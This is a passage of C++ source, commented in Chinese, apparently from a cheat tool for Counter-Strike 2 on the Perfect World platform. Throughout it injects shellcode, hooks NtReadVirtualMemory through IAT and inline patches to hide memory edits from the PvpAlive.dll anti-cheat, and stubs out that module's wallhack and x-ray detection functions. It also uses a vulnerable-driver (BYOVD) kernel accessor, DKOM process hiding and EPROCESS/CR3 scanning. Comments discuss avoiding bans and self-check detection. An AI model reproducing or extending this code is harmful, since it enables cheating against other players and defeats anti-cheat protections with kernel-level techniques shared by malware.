        //   原错误: 4C 01 C0 = add rax, r8 (目标 rax, 源 r8; 但后续 mov [r8] 用 r8 原值 Buffer, 写错位置)
        //   修复后: 49 01 C0 = add r8, rax (目标 r8 = Buffer + offset, 源 rax = offset)
        0x49, 0x01, 0xC0,
        // [0x59] mov word ptr [r8], patchWord  (★ BUILD 566: 参数化, 常量在 +4 = 0x5D)
        //   原 BUILD 565: 0x66, 0x41, 0xC7, 0x00, 0x32, 0xC0  (硬编码 0xC032)
        //   BUILD 566:   0x66, 0x41, 0xC7, 0x00, <patchWord 低>, <patchWord 高>
        0x66, 0x41, 0xC7, 0x00, 0x32, 0xC0,
        // [0x5F] .return: mov eax, [rbp-0x20]  (status)
        0x8B, 0x45, 0xE0,
        // [0x62] add rsp, 0x40
        0x48, 0x83, 0xC4, 0x40,
        // [0x66] pop rbp
        0x5D,
        // [0x67] ret
        0xC3,
    };
    constexpr size_t kTemplateSize = sizeof(kTemplate);  // 104 字节
    static_assert(sizeof(kTemplate) == 104, "B565: filter shellcode size mismatch");

    if (*outSize < kTemplateSize) return false;

    memcpy(outBuf, kTemplate, kTemplateSize);

    // 填充内嵌常量 (8 字节小端)
    *reinterpret_cast<uintptr_t*>(outBuf + 0x16) = originalNtRead;
    *reinterpret_cast<uintptr_t*>(outBuf + 0x35) = patchAddr;
    // ★ BUILD 566: 填充 patchWord (2 字节小端) 到偏移 0x5D
    //   覆盖 kTemplate 中硬编码的 0x32 0xC0
    *reinterpret_cast<uint16_t*>(outBuf + 0x5D) = patchWord;

    *outSize = kTemplateSize;
    return true;
}

bool NtReadHooker::InstallIATHook(HANDLE cs2Process, uintptr_t iatEntryAddr,
                                   uintptr_t originalNtRead,
                                   uintptr_t clientBase, uintptr_t patchAddr) {
    if (!cs2Process || !iatEntryAddr || !originalNtRead) return false;

    // 1. 生成过滤函数 shellcode
    uint8_t shellcode[256] = {};
    size_t shellcodeSize = sizeof(shellcode);
    // ★ BUILD 566: GenerateFilterShellcode 新增 patchSize + patchData 参数
    //   patchSize=2, patchData={0x32, 0xC0} (恢复 32 c0 原始字节)
    uint8_t b566PatchData[2] = { 0x32, 0xC0 };
    if (!GenerateFilterShellcode(shellcode, &shellcodeSize, originalNtRead, patchAddr,
                                  2, b566PatchData)) {
        ByovdDiag("B565:IAT: GenerateFilterShellcode FAILED\n");
        return false;
    }

    // 2. 在 CS2 进程分配可执行内存 (PAGE_EXECUTE_READWRITE)
    //    注意: VirtualAllocEx 已在 kernel32 IAT 中 (loader.exe 也用), 不引入新特征
    LPVOID pAlloc = VirtualAllocEx(cs2Process, nullptr, shellcodeSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pAlloc) {
        ByovdDiag("B565:IAT: VirtualAllocEx FAILED err=%u\n", GetLastError());
        return false;
    }
    uintptr_t filterAddr = (uintptr_t)pAlloc;

    // 3. 写入 shellcode
    if (!stealth::StealthMemory::Write(cs2Process, filterAddr, shellcode, shellcodeSize)) {
        ByovdDiag("B565:IAT: Write shellcode FAILED\n");
        VirtualFreeEx(cs2Process, pAlloc, 0, MEM_RELEASE);
        return false;
    }

    // 4. 读取 IAT 原始值 (保存用于 Uninstall)
    uintptr_t iatOriginalValue = 0;
    if (!stealth::StealthMemory::Read(cs2Process, iatEntryAddr,
                                       &iatOriginalValue, sizeof(iatOriginalValue))) {
        ByovdDiag("B565:IAT: Read IAT original FAILED\n");
        VirtualFreeEx(cs2Process, pAlloc, 0, MEM_RELEASE);
        return false;
    }

    // 5. 临时改 IAT 页保护为 PAGE_READWRITE
    DWORD oldProtect = 0;
    if (!stealth::StealthMemory::Protect(cs2Process, iatEntryAddr, sizeof(uintptr_t),
                                          PAGE_READWRITE, &oldProtect)) {
        ByovdDiag("B565:IAT: Protect(RW) FAILED err=%u\n", GetLastError());
        VirtualFreeEx(cs2Process, pAlloc, 0, MEM_RELEASE);
        return false;
    }

    // 6. 修改 IAT 条目指向过滤函数
    bool writeOk = stealth::StealthMemory::Write(cs2Process, iatEntryAddr,
                                                  &filterAddr, sizeof(filterAddr));

    // 7. 恢复 IAT 页保护 (无论 writeOk 与否都恢复)
    DWORD restoreProtect = 0;
    stealth::StealthMemory::Protect(cs2Process, iatEntryAddr, sizeof(uintptr_t),
                                     oldProtect, &restoreProtect);

    if (!writeOk) {
        ByovdDiag("B565:IAT: Write IAT new value FAILED\n");
        VirtualFreeEx(cs2Process, pAlloc, 0, MEM_RELEASE);
        return false;
    }

    // 8. 记录状态
    m_iatHookActive = true;
    m_iatEntryAddr = iatEntryAddr;
    m_originalNtRead = originalNtRead;
    m_iatOriginalValue = iatOriginalValue;
    m_filterFuncAddr = filterAddr;
    m_filterFuncSize = shellcodeSize;
    (void)clientBase;  // clientBase 不在 IAT hook 状态中保留 (Maintain 不需要)

    ByovdDiag("B565:IAT: hook installed iatEntry=0x%llX origNtRead=0x%llX filter=0x%llX\n",
              (unsigned long long)iatEntryAddr,
              (unsigned long long)originalNtRead,
              (unsigned long long)filterAddr);
    return true;
}

uintptr_t NtReadHooker::FindNtdllNtRead(HANDLE cs2Process) {
    if (!cs2Process) return 0;

    // 1. 跨进程枚举 CS2 模块找 ntdll.dll 基址
    stealth::StealthProcess::ModuleInfo modules[256];
    int modCount = stealth::StealthProcess::GetProcessModules(cs2Process, modules, 256);
    if (modCount <= 0) return 0;

    uintptr_t ntdllBase = 0;
    wchar_t ntdllW[16] = {};
    STEALTH_WSTR_DECRYPT_TO("ntdll.dll", ntdllW, (int)(sizeof(ntdllW) / sizeof(wchar_t)));
    for (int i = 0; i < modCount; i++) {
        if (_wcsicmp(modules[i].name, ntdllW) == 0) {
            ntdllBase = modules[i].baseAddress;
            break;
        }
    }
    SecureZeroMemory(ntdllW, sizeof(ntdllW));
    if (!ntdllBase) return 0;

    // 2. 读 ntdll PE 头, 解析导出表
    IMAGE_DOS_HEADER dosHdr = {};
    if (!stealth::StealthMemory::Read(cs2Process, ntdllBase, &dosHdr, sizeof(dosHdr)))
        return 0;
    if (dosHdr.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64 ntHdr = {};
    if (!stealth::StealthMemory::Read(cs2Process, ntdllBase + dosHdr.e_lfanew,
                                       &ntHdr, sizeof(ntHdr)))
        return 0;
    if (ntHdr.Signature != IMAGE_NT_SIGNATURE) return 0;

    IMAGE_DATA_DIRECTORY exportDir =
        ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exportDir.VirtualAddress) return 0;

    // 3. 读 EXPORT_DIRECTORY
    IMAGE_EXPORT_DIRECTORY expDir = {};
    if (!stealth::StealthMemory::Read(cs2Process, ntdllBase + exportDir.VirtualAddress,
                                       &expDir, sizeof(expDir)))
        return 0;

    // 4. 遍历名称指针数组, 查找 "NtReadVirtualMemory"
    char ntReadA[64] = {};
    STEALTH_STR_DECRYPT_TO("NtReadVirtualMemory", ntReadA, (int)sizeof(ntReadA));

    uintptr_t result = 0;
    uintptr_t nameRvas   = ntdllBase + expDir.AddressOfNames;
    uintptr_t ordinalRvas = ntdllBase + expDir.AddressOfNameOrdinals;
    uintptr_t funcRvas   = ntdllBase + expDir.AddressOfFunctions;

    for (DWORD i = 0; i < expDir.NumberOfNames; i++) {
        DWORD nameRva = 0;
        if (!stealth::StealthMemory::Read(cs2Process,
                                           nameRvas + i * sizeof(DWORD),
                                           &nameRva, sizeof(nameRva)))
            break;
        if (!nameRva) continue;

        char funcName[128] = {};
        stealth::StealthMemory::Read(cs2Process, ntdllBase + nameRva,
                                      funcName, sizeof(funcName) - 1);

        if (_stricmp(funcName, ntReadA) == 0) {
            WORD ordinal = 0;
            stealth::StealthMemory::Read(cs2Process,
                                          ordinalRvas + i * sizeof(WORD),
                                          &ordinal, sizeof(ordinal));
            DWORD funcRva = 0;
            stealth::StealthMemory::Read(cs2Process,
                                          funcRvas + ordinal * sizeof(DWORD),
                                          &funcRva, sizeof(funcRva));
            if (funcRva) {
                result = ntdllBase + funcRva;
            }
            break;
        }
    }

    SecureZeroMemory(ntReadA, sizeof(ntReadA));
    return result;
}

bool NtReadHooker::InstallInlineHook(HANDLE cs2Process, uintptr_t ntReadAddr,
                                      uintptr_t clientBase, uintptr_t patchAddr) {
    if (!cs2Process || !ntReadAddr) return false;
    (void)clientBase;  // clientBase 在 inline hook 中不直接使用 (patch 已编码在 shellcode)

    // ★ BUILD 565: 方案 A 使用 trampoline 模式
    //   ntdll!NtReadVirtualMemory 前 12 字节被覆盖为 jmp filterFunc
    //   trampoline = 原 12 字节 + jmp [rip+0] + 8 字节目标 (ntReadAddr + 12)
    //   过滤函数调用 trampoline, trampoline 执行原 12 字节然后跳回 ntReadAddr + 12
    //   注意: 12 字节足够覆盖 ntdll syscall stub 前 4 条指令
    //         (mov r10, rcx; mov eax, SSN; test ...; jne ...; syscall; ret)

    // 1.1 读原 12 字节
    uint8_t origBytes[16] = {};
    if (!stealth::StealthMemory::Read(cs2Process, ntReadAddr, origBytes, 12)) {
        ByovdDiag("B565:Inline: Read original 12 bytes FAILED\n");
        return false;
    }

    // 1.2 生成过滤函数 shellcode (originalNtRead = trampoline, 稍后修正)
    uint8_t shellcode[256] = {};
    size_t shellcodeSize = sizeof(shellcode);
    // ★ BUILD 566: GenerateFilterShellcode 新增 patchSize + patchData 参数
    //   patchSize=2, patchData={0x32, 0xC0} (恢复 32 c0 原始字节)
    uint8_t b566PatchData[2] = { 0x32, 0xC0 };
    if (!GenerateFilterShellcode(shellcode, &shellcodeSize, 0, patchAddr,
                                  2, b566PatchData)) {
        ByovdDiag("B565:Inline: GenerateFilterShellcode FAILED\n");
        return false;
    }

    // 1.3 生成 trampoline: 原 12 字节 + jmp [rip+0] + 8 字节目标地址
    //   jmp [rip+0] = FF 25 00 00 00 00 (6 字节)
    //   + 8 字节目标 = ntReadAddr + 12
    //   总大小 = 12 + 6 + 8 = 26 字节
    uint8_t trampoline[32] = {};
    memcpy(trampoline, origBytes, 12);
    trampoline[12] = 0xFF;  // jmp [rip+0]
    trampoline[13] = 0x25;
    trampoline[14] = 0x00;
    trampoline[15] = 0x00;
    trampoline[16] = 0x00;
    trampoline[17] = 0x00;
    uintptr_t jmpTarget = ntReadAddr + 12;
    memcpy(trampoline + 18, &jmpTarget, sizeof(jmpTarget));
    constexpr size_t trampolineSize = 26;

    // 2. 分配可执行内存 (shellcode + trampoline)
    SIZE_T allocSize = shellcodeSize + trampolineSize + 16;
    LPVOID pAlloc = VirtualAllocEx(cs2Process, nullptr, allocSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pAlloc) {
        ByovdDiag("B565:Inline: VirtualAllocEx FAILED err=%u\n", GetLastError());
        return false;
    }
    uintptr_t allocBase = (uintptr_t)pAlloc;
    uintptr_t filterAddr = allocBase;
    uintptr_t trampolineAddr = allocBase + shellcodeSize;

    // 3. 修正 shellcode 中的 originalNtRead = trampolineAddr
    *reinterpret_cast<uintptr_t*>(shellcode + 0x16) = trampolineAddr;

    // 4. 写入 shellcode 和 trampoline
    if (!stealth::StealthMemory::Write(cs2Process, filterAddr, shellcode, shellcodeSize)) {
        ByovdDiag("B565:Inline: Write shellcode FAILED\n");
        VirtualFreeEx(cs2Process, pAlloc, 0, MEM_RELEASE);
        return false;
    }
    if (!stealth::StealthMemory::Write(cs2Process, trampolineAddr, trampoline, trampolineSize)) {
        ByovdDiag("B565:Inline: Write trampoline FAILED\n");
        VirtualFreeEx(cs2Process, pAlloc, 0, MEM_RELEASE);
        return false;
    }

    // 5. 改 ntdll 页保护为 RWX
    DWORD oldProtect = 0;
    if (!stealth::StealthMemory::Protect(cs2Process, ntReadAddr, 12,
                                          PAGE_EXECUTE_READWRITE, &oldProtect)) {
        ByovdDiag("B565:Inline: Protect(RWX) FAILED err=%u\n", GetLastError());
        VirtualFreeEx(cs2Process, pAlloc, 0, MEM_RELEASE);
        return false;
    }

    // 6. 写入 jmp 到过滤函数 (12 字节: 48 B8 <8字节地址> FF E0 = mov rax,imm64; jmp rax)
    uint8_t jmpBuf[12] = {};
    jmpBuf[0] = 0x48;  // REX.W
    jmpBuf[1] = 0xB8;  // mov rax, imm64
    memcpy(jmpBuf + 2, &filterAddr, sizeof(filterAddr));
    jmpBuf[10] = 0xFF;  // jmp rax
    jmpBuf[11] = 0xE0;

    bool writeOk = stealth::StealthMemory::Write(cs2Process, ntReadAddr, jmpBuf, sizeof(jmpBuf));

    // 7. 恢复 ntdll 页保护
    DWORD restoreProtect = 0;
    stealth::StealthMemory::Protect(cs2Process, ntReadAddr, 12,
                                     oldProtect, &restoreProtect);

    if (!writeOk) {
        ByovdDiag("B565:Inline: Write jmp FAILED\n");
        VirtualFreeEx(cs2Process, pAlloc, 0, MEM_RELEASE);
        return false;
    }

    // 8. 记录状态
    m_inlineHookActive = true;
    m_ntdllNtReadAddr = ntReadAddr;
    memcpy(m_ntdllOriginalBytes, origBytes, 12);
    m_inlineFilterFuncAddr = allocBase;
    m_inlineFilterFuncSize = allocSize;
    m_originalNtRead = ntReadAddr;

    ByovdDiag("B565:Inline: hook installed ntRead=0x%llX filter=0x%llX tramp=0x%llX\n",
              (unsigned long long)ntReadAddr,
              (unsigned long long)filterAddr,
              (unsigned long long)trampolineAddr);
    return true;
}

bool NtReadHooker::Install(HANDLE cs2Process, uintptr_t clientBase, uintptr_t patchAddr) {
    if (!cs2Process || !clientBase || !patchAddr) return false;
    if (m_active) return true;

    m_cs2Process = cs2Process;
    m_clientBase = clientBase;
    m_patchAddr = patchAddr;

    // ★ BUILD 567 v3.257 DIAG: Install 入口 (StateLog 不受 NDEBUG 影响)
    StateLog("NRD", "InstallEntry", "cs2Proc=0x%p clientBase=0x%llX patchAddr=0x%llX",
             cs2Process, (unsigned long long)clientBase, (unsigned long long)patchAddr);

    // 方案 B: IAT hook PvpAlive.dll (唯一方案)
    // ★ BUILD 567 v3.295 FIX: 移除 inline hook ntdll 回退 (方案 A)
    //   原因: v3.261 永久禁用 NtReadHooker 是因为 inline hook ntdll 被 CS2 自检检测.
    //         但 IAT hook PvpAlive.dll (方案 B) 不碰 ntdll, CS2 自检不会发现.
    //         v3.293 封号根因: IAT hook 被一并禁用, PvpAlive.dll 自由扫描 client.dll
    //         发现 90 90 patch → 上报 → 封号.
    //   修复: 只启用 IAT hook (方案 B), 永不回退到 inline hook (方案 A).
    //         IAT hook 失败时直接返回 false, 不 hook ntdll.
    uintptr_t pvpBase = FindPvpAliveBase(cs2Process);
    if (pvpBase) {
        StateLog("NRD", "PvpFound", "pvpBase=0x%llX", (unsigned long long)pvpBase);
        uintptr_t originalNtRead = 0;
        uintptr_t iatEntry = FindNtReadInIAT(cs2Process, pvpBase, &originalNtRead);
        if (iatEntry && originalNtRead) {
            if (InstallIATHook(cs2Process, iatEntry, originalNtRead, clientBase, patchAddr)) {
                m_active = true;
                m_pvpAliveBase = pvpBase;
                StateLog("NRD", "IATSuccess", "pvp=0x%llX ff=0x%llX",
                         (unsigned long long)pvpBase,
                         (unsigned long long)m_filterFuncAddr);
                return true;
            }
            StateLog("NRD", "IATFail", "no fallback (inline disabled)");
        } else {
            StateLog("NRD", "NtReadNotInIAT", "entry=0x%llX orig=0x%llX no fallback",
                     (unsigned long long)iatEntry, (unsigned long long)originalNtRead);
        }
    } else {
        StateLog("NRD", "PvpNotFound", "no fallback (inline disabled)");
    }

    // ★ v3.295: 不再回退到 inline hook ntdll (方案 A 被 CS2 自检检测)
    StateLog("NRD", "InstallFail", "IAT hook only, inline disabled");
    return false;
}

void NtReadHooker::Uninstall() {
    if (!m_active) return;

    // 方案 B: 恢复 IAT
    if (m_iatHookActive && m_cs2Process && m_iatEntryAddr) {
        DWORD oldProtect = 0;
        if (stealth::StealthMemory::Protect(m_cs2Process, m_iatEntryAddr, sizeof(uintptr_t),
                                              PAGE_READWRITE, &oldProtect)) {
            uintptr_t origValue = m_iatOriginalValue;
            stealth::StealthMemory::Write(m_cs2Process, m_iatEntryAddr,
                                           &origValue, sizeof(origValue));
            DWORD restoreProtect = 0;
            stealth::StealthMemory::Protect(m_cs2Process, m_iatEntryAddr, sizeof(uintptr_t),
                                             oldProtect, &restoreProtect);
        }
        if (m_filterFuncAddr) {
            VirtualFreeEx(m_cs2Process, (LPVOID)m_filterFuncAddr, 0, MEM_RELEASE);
        }
        m_iatHookActive = false;
        ByovdDiag("B565:Uninstall: IAT hook restored\n");
    }

    // 方案 A: 恢复 ntdll
    if (m_inlineHookActive && m_cs2Process && m_ntdllNtReadAddr) {
        DWORD oldProtect = 0;
        if (stealth::StealthMemory::Protect(m_cs2Process, m_ntdllNtReadAddr, 12,
                                              PAGE_EXECUTE_READWRITE, &oldProtect)) {
            stealth::StealthMemory::Write(m_cs2Process, m_ntdllNtReadAddr,
                                           m_ntdllOriginalBytes, 12);
            DWORD restoreProtect = 0;
            stealth::StealthMemory::Protect(m_cs2Process, m_ntdllNtReadAddr, 12,
                                             oldProtect, &restoreProtect);
        }
        if (m_inlineFilterFuncAddr) {
            VirtualFreeEx(m_cs2Process, (LPVOID)m_inlineFilterFuncAddr, 0, MEM_RELEASE);
        }
        m_inlineHookActive = false;
        ByovdDiag("B565:Uninstall: inline hook restored\n");
    }

    m_active = false;
    m_iatEntryAddr = 0;
    m_iatOriginalValue = 0;
    m_originalNtRead = 0;
    m_filterFuncAddr = 0;
    m_filterFuncSize = 0;
    m_pvpAliveBase = 0;
    m_ntdllNtReadAddr = 0;
    m_inlineFilterFuncAddr = 0;
    m_inlineFilterFuncSize = 0;
    memset(m_ntdllOriginalBytes, 0, sizeof(m_ntdllOriginalBytes));
}

bool NtReadHooker::Maintain() {
    if (!m_active || !m_cs2Process) return false;

    // ★ BUILD 567 v3.257 DIAG: Maintain 入口日志 (StateLog 不受 NDEBUG 影响)
    //   调查 CS2 对局加载崩溃: 记录 Maintain 入口状态, 确认 Maintain 是否被调用
    StateLog("NRD", "MaintainEntry", "iat=%d inl=%d pvp=0x%llX ff=0x%llX nf=0x%llX",
             m_iatHookActive ? 1 : 0,
             m_inlineHookActive ? 1 : 0,
             (unsigned long long)m_pvpAliveBase,
             (unsigned long long)m_filterFuncAddr,
             (unsigned long long)m_inlineFilterFuncAddr);

    // 方案 B: 检测 PvpAlive.dll 是否重载 (基址变化)
    if (m_iatHookActive) {
        uintptr_t curPvpBase = FindPvpAliveBase(m_cs2Process);
        // ★ BUILD 567 v3.257 DIAG: PvpAlive 基址检测结果
        //   curPvpBase=0 → CS2 卸载 PvpAlive.dll (对局加载可能触发)
        //   curPvpBase != m_pvpAliveBase → PvpAlive.dll 重载 (基址变化)
        StateLog("NRD", "PvpCheck", "old=0x%llX new=0x%llX changed=%d",
                 (unsigned long long)m_pvpAliveBase,
                 (unsigned long long)curPvpBase,
                 (curPvpBase != m_pvpAliveBase) ? 1 : 0);
        if (curPvpBase != m_pvpAliveBase) {
            StateLog("NRD", "PvpChanged", "old=0x%llX new=0x%llX rehooking",
                     (unsigned long long)m_pvpAliveBase,
                     (unsigned long long)curPvpBase);
            // 释放旧 filter 函数内存 (不恢复 IAT — PvpAlive 已卸载, IAT 已无效)
            if (m_filterFuncAddr) {
                VirtualFreeEx(m_cs2Process, (LPVOID)m_filterFuncAddr, 0, MEM_RELEASE);
                m_filterFuncAddr = 0;
            }
            m_iatHookActive = false;

            // ★ v3.295: 只重新安装 IAT hook (方案 B), 不回退到 inline hook (方案 A)
            if (curPvpBase) {
                uintptr_t originalNtRead = 0;
                uintptr_t iatEntry = FindNtReadInIAT(m_cs2Process, curPvpBase, &originalNtRead);
                StateLog("NRD", "RehookIAT", "iatEntry=0x%llX origNtRead=0x%llX",
                         (unsigned long long)iatEntry,
                         (unsigned long long)originalNtRead);
                if (iatEntry && originalNtRead &&
                    InstallIATHook(m_cs2Process, iatEntry, originalNtRead,
                                    m_clientBase, m_patchAddr)) {
                    m_pvpAliveBase = curPvpBase;
                    StateLog("NRD", "IATRehooked", "pvp=0x%llX ff=0x%llX",
                             (unsigned long long)m_pvpAliveBase,
                             (unsigned long long)m_filterFuncAddr);
                    return true;
                }
            }
            // ★ v3.295: IAT rehook 失败, 不再尝试 inline hook, 直接标记 inactive
            StateLog("NRD", "IATRehookFail", "no inline fallback, m_active=false");
            m_active = false;
            return false;
        }
    }

    // ★ v3.295: 移除方案 A (inline hook ntdll) 的维护逻辑
    //   原因: inline hook ntdll 被 CS2 自检检测, 永久禁用.
    //   IAT hook 模式不需要检测 ntdll 是否被恢复.

    StateLog("NRD", "MaintainExit", "OK (no change)");
    return true;  // hook 仍活跃
}

// ============================================================
// ★ BUILD 567 v3.289: PvpAlivePatcher 实现
// ============================================================

// 4 个函数的 patch 数据 (基于 PvpAlive_dumped.dll 逆向分析)
namespace {
    struct PacNovaFuncInfo {
        const char* name;
        uintptr_t rva;
        const uint8_t* sig;     // 特征字节 (32B)
        size_t sigLen;
        const uint8_t* patch;   // patch 字节
        size_t patchLen;
    };

    // 特征字节 (32 字节)
    const uint8_t g_sigGetIsXrayOpen[] = {
        0x55,0x8B,0xEC,0x6A,0xFF,0x68,0xED,0x7A,0xCC,0x5B,0x64,0xA1,0x00,0x00,0x00,0x00,
        0x50,0x83,0xEC,0x10,0xA1,0xD4,0xF8,0xE0,0x5B,0x33,0xC5,0x89,0x45,0xF0,0x50,0x8D
    };
    const uint8_t g_sigIsWallTransparentHack[] = {
        0x55,0x8B,0xEC,0x6A,0xFF,0x68,0xE5,0x5C,0xCD,0x5B,0x64,0xA1,0x00,0x00,0x00,0x00,
        0x50,0x83,0xEC,0x1C,0xA1,0xD4,0xF8,0xE0,0x5B,0x33,0xC5,0x89,0x45,0xF0,0x50,0x8D
    };
    const uint8_t g_sigIsWallMaterialHack[] = {
        0x55,0x8B,0xEC,0x6A,0xFF,0x68,0x87,0x33,0xCD,0x5B,0x64,0xA1,0x00,0x00,0x00,0x00,
        0x50,0x51,0x81,0xEC,0x00,0x0A,0x00,0x00,0xA1,0xD4,0xF8,0xE0,0x5B,0x33,0xC5,0x89
    };
    const uint8_t g_sigIsNameHack[] = {
        0x55,0x8B,0xEC,0x6A,0xFF,0x68,0x71,0x18,0xCD,0x5B,0x64,0xA1,0x00,0x00,0x00,0x00,
        0x50,0x81,0xEC,0x54,0x02,0x00,0x00,0xA1,0xD4,0xF8,0xE0,0x5B,0x33,0xC5,0x89,0x45
    };

    // patch 字节
    const uint8_t g_patchRet[]      = { 0x31, 0xC0, 0xC3 };           // xor eax,eax; ret
    const uint8_t g_patchRet0C[]    = { 0x31, 0xC0, 0xC2, 0x0C, 0x00 }; // xor eax,eax; ret 0xc

    const PacNovaFuncInfo g_funcs[] = {
        { "GetIsXrayOpen",         0x00198D40, g_sigGetIsXrayOpen,        32, g_patchRet,   3 },
        { "IsWallTransparentHack", 0x0017B0E0, g_sigIsWallTransparentHack, 32, g_patchRet,   3 },
        { "IsWallMaterialHack",    0x001669E0, g_sigIsWallMaterialHack,    32, g_patchRet,   3 },
        { "IsNameHack",            0x001591C0, g_sigIsNameHack,            32, g_patchRet0C, 5 },
    };
}

// --- FindPerfectWorldPid ---
// 枚举进程, 查找 "完美世界竞技平台.exe"
// 用 Toolhelp32 (用户态 API), 不需要内核 driver
// ★ 注意: STEALTH_WSTR_DECRYPT_TO 只支持 ASCII, 中文进程名用明文 (低风险, 进程名本身不是敏感信息)
DWORD PvpAlivePatcher::FindPerfectWorldPid() {
    const wchar_t* pwaName = L"完美世界竞技平台.exe";

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, pwaName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return pid;
}

// --- GetProcessCR3 ---
// 获取目标进程的 CR3 (DirectoryBase)
// 通过 EPROCESS 读取, 偏移运行时扫描
uint64_t PvpAlivePatcher::GetProcessCR3(DWORD pid) {
    if (!pid) return 0;

    // 获取 BYOVD driver 和 EPROCESS
    KernelMemoryAccessor& kma = KernelMemoryAccessor::Instance();
    uint64_t ntBase = kma.GetNtoskrnlBase();
    if (!ntBase) {
        StateLog("PVP", "CR3Fail", "step=ntBase (GetNtoskrnlBase failed)");
        return 0;
    }

    // 确保 DKOM 偏移已解析 (pidOffset, linksOffset)
    auto& dkom = DKOMProcessHider::Instance();
    if (!dkom.EnsureOffsetsResolved(kma, ntBase)) {
        StateLog("PVP", "CR3Fail", "step=EnsureOffsets ntBase=0x%llX", (unsigned long long)ntBase);
        return 0;
    }

    // 查找目标进程 EPROCESS
    uint64_t eproc = dkom.FindEPROCESSByPid(kma, pid);
    if (!eproc) {
        StateLog("PVP", "CR3Fail", "step=FindEPROC pid=%u", pid);
        return 0;
    }
    StateLog("PVP", "CR3Step", "step=EPROC ok=0x%llX pid=%u", (unsigned long long)eproc, pid);

    // ★ 扫描 EPROCESS 找 DirectoryBase (CR3)
    //   Windows 10/11: EPROCESS.DirectoryBase 通常在 0x28 (Win10) 或 0x1010 (新版本)
    //   特征: 值是物理地址 (低 12 位通常为 0, 且 < 16GB)
    //   验证: 用该 CR3 翻译 EPROCESS 自身 VA, 应该能成功
    //
    // 扫描策略:
    //   1. 先试常见偏移 (0x28, 0x1010)
    //   2. 如果失败, 扫描 0x0-0x1800 范围, 找符合 CR3 特征的值

    // ★ BUILD 567 v3.294 FIX: PCID 支持 — CR3 低 12 位可能包含 PCID (Process Context ID)
    //   Windows 10/11 启用 PCID 后, EPROCESS.DirectoryBase 低 12 位不再全为 0,
    //   例如 0x2B83F3002 (低12位=0x002 是 PCID, 不是页对齐错误)
    //   PageTableWalker 构造函数已用 (cr3 & ~0xFFF) 清除低 12 位, 所以 VaToPa 仍正确
    //   修复: 放宽验证条件, 用 VaToPa 成功作为唯一判据 (不再要求低 12 位为 0)
    //   日志证据: v3.293 测试 off=0x28 val=0x2B83F3002 被错误拒绝 (PCID=0x002)
    const uint32_t commonOffsets[] = { 0x28, 0x1010, 0x110, 0x140 };
    for (uint32_t off : commonOffsets) {
        StateLog("PVP", "CR3PreReadOff", "off=0x%X EPROC=0x%llX", off, (unsigned long long)eproc);
        uint64_t val = kma.ReadUnsafe<uint64_t>(eproc + off);
        StateLog("PVP", "CR3PostReadOff", "off=0x%X val=0x%llX", off, (unsigned long long)val);
        // ★ v3.294: 放宽条件 — 只要求高 52 位 (PFN) 在合理物理内存范围 (< 16GB)
        //   低 12 位可能包含 PCID 标志, 不再要求为 0
        uint64_t pfn = val & ~0xFFFULL;  // 取高 52 位 (物理页帧)
        if (pfn >= 0x10000 && pfn < 0x400000000ULL && val != 0) {
            // 验证: 用该 CR3 翻译 EPROCESS 自身 VA (唯一可靠判据)
            StateLog("PVP", "CR3PreVaToPa", "off=0x%X CR3=0x%llX VA=0x%llX", off, (unsigned long long)val, (unsigned long long)eproc);
            PageTableWalker walker(val, kma);
            uint64_t pa = walker.VaToPa(eproc);
            StateLog("PVP", "CR3PostVaToPa", "off=0x%X PA=0x%llX", off, (unsigned long long)pa);
            if (pa != 0) {
                StateLog("PVP", "CR3OK", "pid=%u EPROC=0x%llX CR3=0x%llX (offset=0x%X PCID=0x%X)",
                    pid, (unsigned long long)eproc, (unsigned long long)val, off, (unsigned)(val & 0xFFF));
                return val;
            }
        }
    }

    // 扫描 0x0-0x1800 范围
    StateLog("PVP", "CR3Step", "step=scan common offsets failed, trying 0x0-0x1800");
    // ★ v3.293 DIAG: 扫描分 6 段记录进度, 避免蓝屏时不知道扫描到哪
    for (uint32_t off = 0x0; off < 0x1800; off += 8) {
        if ((off & 0x3FF) == 0) {
            StateLog("PVP", "CR3ScanProg", "off=0x%X/0x1800", off);
        }
        uint64_t val = kma.ReadUnsafe<uint64_t>(eproc + off);
        // ★ v3.294: 同样放宽扫描条件
        uint64_t pfn = val & ~0xFFFULL;
        if (pfn >= 0x10000 && pfn < 0x400000000ULL && val != 0) {
            StateLog("PVP", "CR3ScanHit", "off=0x%X val=0x%llX", off, (unsigned long long)val);
            PageTableWalker walker(val, kma);
            uint64_t pa = walker.VaToPa(eproc);
            if (pa != 0) {
                StateLog("PVP", "CR3OK", "pid=%u EPROC=0x%llX CR3=0x%llX (scan offset=0x%X PCID=0x%X)",
                    pid, (unsigned long long)eproc, (unsigned long long)val, off, (unsigned)(val & 0xFFF));
                return val;
            }
        }
    }

    StateLog("PVP", "CR3Fail", "step=scan no valid CR3 in EPROCESS (pid=%u EPROC=0x%llX)",
        pid, (unsigned long long)eproc);
    return 0;
}

// --- FindPvpAliveBase ---
// 在目标进程内查找 PvpAlive.dll 基址
// 通过 PEB.Ldr 枚举模块 (用目标进程 CR3 翻译 PEB VA)
uintptr_t PvpAlivePatcher::FindPvpAliveBase(DWORD pid, uint64_t cr3) {
    if (!pid || !cr3) return 0;

    KernelMemoryAccessor& kma = KernelMemoryAccessor::Instance();
    uint64_t ntBase = kma.GetNtoskrnlBase();
    if (!ntBase) return 0;

    auto& dkom = DKOMProcessHider::Instance();
    uint64_t eproc = dkom.FindEPROCESSByPid(kma, pid);
    if (!eproc) return 0;

    // ★ 读取 EPROCESS.PEB (偏移因版本不同, 扫描)
    //   PEB 是用户态地址 (0x00000000-0x00007FFFFFFF)
    //   EPROCESS.PEB 偏移通常在 0x3F8-0x550 范围
    uint64_t pebVA = 0;
    for (uint32_t off = 0x300; off < 0x600; off += 8) {
        uint64_t val = kma.ReadUnsafe<uint64_t>(eproc + off);
